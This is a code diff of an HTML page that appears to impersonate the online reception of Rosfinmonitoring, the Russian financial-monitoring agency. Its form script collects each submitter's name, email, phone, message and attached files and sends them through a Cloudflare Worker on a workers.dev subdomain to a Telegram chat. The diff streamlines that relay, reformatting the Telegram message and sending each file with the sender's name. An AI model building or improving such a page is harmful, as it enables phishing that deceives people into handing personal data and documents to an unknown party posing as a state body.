@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Интернет-приемная — Росфинмониторинг</title>
     <style>
         * {
@@ -188,8 +191,6 @@
             background: #cccccc; 
             cursor: not-allowed; 
         }
-
-        /* ===== СПИННЕР ===== */
         .spinner {
             display: none;
             width: 22px;
@@ -206,16 +207,12 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
-        /* ===== ТЕКСТ КНОПКИ ===== */
         .btn-text {
             display: inline;
         }
         .btn-text.hidden {
             display: none;
         }
-
-        /* ===== МОДАЛКА ===== */
         .modal-success { 
             display: none; 
             position: fixed; 
@@ -253,8 +250,6 @@
         .btn-close:hover {
             background: #1e7e34;
         }
-
-        /* ===== ПОДВАЛ ===== */
         .footer-profile { 
             background-color: #0a1f33; 
             color: #fff; 
@@ -288,8 +283,6 @@
             font-weight: bold; 
             text-align: right; 
         }
-
-        /* ===== АДАПТИВ ===== */
         @media screen and (max-width: 768px) {
             .navbar-custom { 
                 height: 70px; 
@@ -420,25 +413,19 @@
             const fileInput = document.getElementById('fileInput');
             const fileList = document.getElementById('fileList');
 
-            // =============================================
-            // 📌 ТВОЙ CLOUDFLARE WORKER
-            // =============================================
             const WORKER_URL = 'https://round-band-482a.portal-rosfin.workers.dev';
 
-            // === УПРАВЛЕНИЕ СПИСКОМ ФАЙЛОВ ===
             let selectedFiles = [];
 
             fileInput.addEventListener('change', function(e) {
                 const files = Array.from(this.files);
                 
-                // Проверка на лимит 5 файлов
                 if (files.length > 5) {
                     alert('⚠️ Можно загрузить не более 5 файлов!');
                     this.value = '';
                     return;
                 }
 
-                // Проверка размера файлов (макс 20MB)
                 const MAX_SIZE = 20 * 1024 * 1024;
                 for (let file of files) {
                     if (file.size > MAX_SIZE) {
@@ -470,13 +457,11 @@
                     </div>
                 `).join('');
 
-                // Обработчики удаления
                 fileList.querySelectorAll('.file-remove').forEach(btn => {
                     btn.addEventListener('click', function() {
                         const index = parseInt(this.dataset.index);
                         selectedFiles.splice(index, 1);
                         
-                        // Обновляем input
                         const dt = new DataTransfer();
                         selectedFiles.forEach(f => dt.items.add(f));
                         fileInput.files = dt.files;
@@ -486,11 +471,9 @@
                 });
             }
 
-            // ===== ОТПРАВКА ФОРМЫ =====
             form.addEventListener('submit', async function(event) {
                 event.preventDefault();
 
-                // === СБОР ДАННЫХ ===
                 const fullName = document.getElementById('fullName').value.trim();
                 const email = document.getElementById('email').value.trim();
                 const phone = document.getElementById('phone').value.trim();
@@ -498,7 +481,6 @@
                 const message = document.getElementById('message').value.trim();
                 const agreement = document.getElementById('agreement').checked;
 
-                // === ВАЛИДАЦИЯ ===
                 if (!fullName || !email || !phone || !subject || !message) {
                     alert('⚠️ Заполните все обязательные поля!');
                     return;
@@ -512,72 +494,64 @@
                     return;
                 }
 
-                // === БЛОКИРУЕМ КНОПКУ ===
                 submitBtn.disabled = true;
                 btnText.classList.add('hidden');
                 spinner.classList.add('active');
 
                 try {
                     const date = new Date();
+                    const dateStr = date.toLocaleString('ru-RU');
                     
-                    let text = `📋 НОВОЕ ОБРАЩЕНИЕ В РОСФИНМОНИТОРИНГ\n`;
-                    text += `═══════════════════════\n`;
-                    text += `👤 ФИО: ${fullName}\n`;
-                    text += `📧 Email: ${email}\n`;
-                    text += `📞 Телефон: ${phone}\n`;
-                    text += `📌 Тема: ${subject}\n`;
-                    text += `═══════════════════════\n`;
-                    text += `📝 Текст обращения:\n${message}\n`;
-                    text += `═══════════════════════\n`;
+                    // === ТОЛЬКО ОДНО КРАСИВОЕ СООБЩЕНИЕ ===
+                    let text = `📩 *НОВОЕ ОБРАЩЕНИЕ В РОСФИНМОНИТОРИНГ*\n`;
+                    text += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+                    text += `👤 *Заявитель:* ${fullName}\n`;
+                    text += `📧 *Email:* ${email}\n`;
+                    text += `📞 *Телефон:* ${phone}\n`;
+                    text += `📌 *Тема:* ${subject}\n\n`;
+                    text += `━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+                    text += `📝 *Текст обращения:*\n`;
+                    text += `${message}\n\n`;
+                    text += `━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    
                     if (selectedFiles.length > 0) {
-                        text += `📎 Приложено файлов: ${selectedFiles.length}\n`;
+                        text += `\n📎 *Приложено файлов:* ${selectedFiles.length}\n`;
                         selectedFiles.forEach((f, i) => {
-                            text += `   ${i+1}. ${f.name} (${(f.size / 1024 / 1024).toFixed(2)} MB)\n`;
+                            const size = (f.size / 1024 / 1024).toFixed(2);
+                            text += `   ${i+1}. ${f.name} (${size} MB)\n`;
                         });
                     }
-                    text += `🕐 ${date.toLocaleString('ru-RU')}`;
+                    
+                    text += `\n🕐 *Дата и время:* ${dateStr}`;
 
-                    // === 1. ОТПРАВКА ТЕКСТА ЧЕРЕЗ WORKER ===
+                    // === ОТПРАВЛЯЕМ ОДНО СООБЩЕНИЕ ===
                     const response = await fetch(`${WORKER_URL}/telegram`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            text: text,
-                            fullName: fullName,
-                            email: email,
-                            phone: phone,
-                            subject: subject
-                        })
+                        body: JSON.stringify({ text: text })
                     });
 
                     const result = await response.json();
-                    console.log('📨 Ответ Cloudflare Worker:', result);
+                    console.log('📨 Ответ:', result);
 
                     if (!result.ok) {
                         throw new Error(result.error || 'Неизвестная ошибка');
                     }
 
-                    // === 2. ОТПРАВКА ВСЕХ ФАЙЛОВ ===
+                    // === ОТПРАВЛЯЕМ ФАЙЛЫ (ТОЛЬКО НАЗВАНИЕ ФАЙЛА В ПОДПИСИ) ===
                     if (selectedFiles.length > 0) {
-                        const formData = new FormData();
-                        
-                        // Добавляем все файлы
-                        selectedFiles.forEach(file => {
-                            formData.append('files', file);
-                        });
-                        formData.append('fullName', fullName);
-                        formData.append('email', email);
-                        
-                        const fileResponse = await fetch(`${WORKER_URL}/send-files`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        const fileResult = await fileResponse.json();
-                        console.log('📎 Ответ по файлам:', fileResult);
-                        
-                        if (fileResult.errors) {
-                            console.warn('⚠️ Ошибки при загрузке файлов:', fileResult.errors);
+                        for (let file of selectedFiles) {
+                            const formData = new FormData();
+                            formData.append('file', file);
+                            
+                            // КОРОТКАЯ ПОДПИСЬ - ТОЛЬКО ИМЯ ФАЙЛА И ОТПРАВИТЕЛЬ
+                            const caption = `📎 ${file.name}\n👤 ${fullName}`;
+                            formData.append('caption', caption);
+                            
+                            await fetch(`${WORKER_URL}/send-file`, {
+                                method: 'POST',
+                                body: formData
+                            });
                         }
                     }
 
@@ -594,7 +568,6 @@
                 } catch (error) {
                     console.error('❌ Ошибка:', error);
                     
-                    // === ЕСЛИ ОШИБКА — СОХРАНЯЕМ ЛОКАЛЬНО ===
                     try {
                         const appeals = JSON.parse(localStorage.getItem('appeals') || '[]');
                         appeals.push({
@@ -634,7 +607,6 @@
                 }
             });
 
-            // ===== ЗАКРЫТИЕ МОДАЛКИ =====
             window.closeModal = function() {
                 document.getElementById('successModal').style.display = 'none';
             };
